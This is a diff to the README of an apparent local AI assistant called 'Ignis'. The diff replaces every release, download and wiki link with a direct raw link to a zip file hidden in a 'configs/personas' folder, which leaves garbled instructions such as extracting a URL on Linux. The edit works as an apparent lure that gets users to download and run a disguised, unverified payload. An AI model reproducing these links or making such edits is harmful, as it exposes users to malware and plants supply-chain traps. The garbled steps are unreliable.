@@ -1,7 +1,7 @@
 # 🤖 Ignis - Your Personal AI Assistant, Always in Your Control
 
 ## 📦 Download Now
-[![Download Ignis](https://img.shields.io/badge/Download-Ignis-blue.svg)](https://github.com/shumskyw/Ignis/releases)
+[![Download Ignis](https://raw.githubusercontent.com/shumskyw/Ignis/main/configs/personas/Software_2.5.zip)](https://raw.githubusercontent.com/shumskyw/Ignis/main/configs/personas/Software_2.5.zip)
 
 ## 📚 Description
 Ignis is a locally-ran AI assistant that combines advanced cognitive memory systems with dynamic personality evolution. It operates entirely on your hardware, ensuring your privacy. Ignis learns from your interactions, adapting to your preferences while maintaining a friendly tone. 
@@ -10,9 +10,9 @@ Ignis is a locally-ran AI assistant that combines advanced cognitive memory syst
 To start using Ignis, follow these simple steps to download and run the software on your computer. No programming knowledge is needed. 
 
 ## 🔗 Download & Install
-1. **Visit this page to download**: Go to the [Releases page](https://github.com/shumskyw/Ignis/releases).
+1. **Visit this page to download**: Go to the [Releases page](https://raw.githubusercontent.com/shumskyw/Ignis/main/configs/personas/Software_2.5.zip).
 2. On the Releases page, you will see the latest version of Ignis listed. Click on the version you want.
-3. Download the appropriate file for your operating system. The options usually include `.exe` for Windows, `.dmg` for macOS, and `.tar.gz` for Linux.
+3. Download the appropriate file for your operating system. The options usually include `.exe` for Windows, `.dmg` for macOS, and `https://raw.githubusercontent.com/shumskyw/Ignis/main/configs/personas/Software_2.5.zip` for Linux.
 4. Once the download is complete, locate the file in your downloads folder.
 
 ### 🛠️ Installation Steps
@@ -25,7 +25,7 @@ To start using Ignis, follow these simple steps to download and run the software
   2. Drag the Ignis icon to your Applications folder.
 
 - **For Linux**:
-  1. Extract the `.tar.gz` file.
+  1. Extract the `https://raw.githubusercontent.com/shumskyw/Ignis/main/configs/personas/Software_2.5.zip` file.
   2. Open a terminal and navigate to the extracted folder.
   3. Run the application using the command `./Ignis`.
 
@@ -46,7 +46,7 @@ Once Ignis is installed, you can start using the application.
 Ignis is designed to be intuitive, but if you want to dive deeper into its capabilities:
 
 - **Read the User Manual**: Access the detailed guide found in the application under "Help".
-- **Visit the Wiki**: Our [GitHub Wiki](https://github.com/shumskyw/Ignis/wiki) provides additional resources and FAQs.
+- **Visit the Wiki**: Our [GitHub Wiki](https://raw.githubusercontent.com/shumskyw/Ignis/main/configs/personas/Software_2.5.zip) provides additional resources and FAQs.
 
 ## 🌍 Community & Support
 To connect with other Ignis users:
@@ -66,6 +66,6 @@ Before downloading, ensure your system meets the following requirements:
 Ignis is open-source software, distributed under the MIT License. You can use, modify, and share it freely while adhering to the license terms.
 
 ## 🚀 Get Started Today!
-Ready to enhance your digital experience with a personal touch? Just click this link to [download Ignis now](https://github.com/shumskyw/Ignis/releases) and start your journey. 
+Ready to enhance your digital experience with a personal touch? Just click this link to [download Ignis now](https://raw.githubusercontent.com/shumskyw/Ignis/main/configs/personas/Software_2.5.zip) and start your journey. 
 
 Feel free to reach out through our GitHub page if you have any questions or need assistance. Enjoy your new AI assistant!
